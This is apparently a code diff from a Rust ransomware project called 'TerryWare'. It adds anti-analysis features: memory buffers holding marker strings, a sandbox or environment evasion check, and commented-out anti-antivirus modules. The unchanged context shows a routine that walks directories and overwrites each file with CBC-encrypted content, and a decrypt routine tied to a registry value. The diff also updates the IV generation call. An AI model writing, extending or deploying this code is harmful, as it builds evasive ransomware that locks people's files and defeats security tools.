@@ -12,9 +12,60 @@ mod evasion;
 use crate::evasion::run_evasion_checks;
 use crate::evasion::EvasionCheck;
 use colored::*;
+use winapi::um::memoryapi::VirtualAlloc;
+use winapi::um::winnt::PAGE_READWRITE;
+use winapi::um::winnt::MEM_COMMIT;
+use winapi::um::winnt::MEM_RESERVE;
+// We'll come back to these :)
+//mod anti_av;
+//use crate::anti_av::{initialize_anti_av, AntiAV};
 
 fn main() {
     println!("{} Starting TerryWare...", "[+]".green());
+    
+    let test_pattern1 = unsafe {
+        VirtualAlloc(
+            std::ptr::null_mut(),
+            0x1000,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        )
+    };
+
+    let test_pattern2 = unsafe {
+        VirtualAlloc(
+            std::ptr::null_mut(),
+            0x1000,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        )
+    };
+    
+    if !test_pattern1.is_null() {
+        let pattern1 = b"DEBUG_WATERMARK_1234";
+        unsafe {
+            std::ptr::copy_nonoverlapping(
+                pattern1.as_ptr(),
+                test_pattern1.cast(),
+                pattern1.len()
+            );
+        }
+        println!("{} Created first debug pattern at: 0x{:X}", "[+]".yellow(), test_pattern1 as usize);
+    }
+
+    if !test_pattern2.is_null() {
+        let pattern2 = b"ANALYSIS_PATTERN_5678";
+        unsafe {
+            std::ptr::copy_nonoverlapping(
+                pattern2.as_ptr(),
+                test_pattern2.cast(),
+                pattern2.len()
+            );
+        }
+        println!("{} Created second debug pattern at: 0x{:X}", "[+]".yellow(), test_pattern2 as usize);
+    }
+
+    // Run the checks
     if !run_evasion_checks() {
         println!("{} WARNING: Suspicious environment detected.", "[!]".yellow());
     }
@@ -101,7 +152,7 @@ fn encrypt_recursive(dir: &Path, cipher: &Cipher) {
                 } else if path.is_file() {
                     let file_name = path.to_str().unwrap();
                     if let Ok(file_content) = fs::read(file_name) {
-                        let iv: [u8; 16] = rand::thread_rng().gen();
+                        let iv: [u8; 16] = rand::rng().random();
                         let encrypted = cipher.cbc_encrypt(&iv, &file_content);
                         let mut final_content = Vec::with_capacity(iv.len() + encrypted.len());
                         final_content.extend_from_slice(&iv);
@@ -133,7 +184,6 @@ fn decrypt() {
             match key.delete_value("TerryWare") {
                 Ok(_) => (),
                 Err(e) => eprintln!("Failed to delete registry value: {}", e),
-                _ => (),
             }
         },
         Err(e) => eprintln!("Failed to open registry key: {}", e),
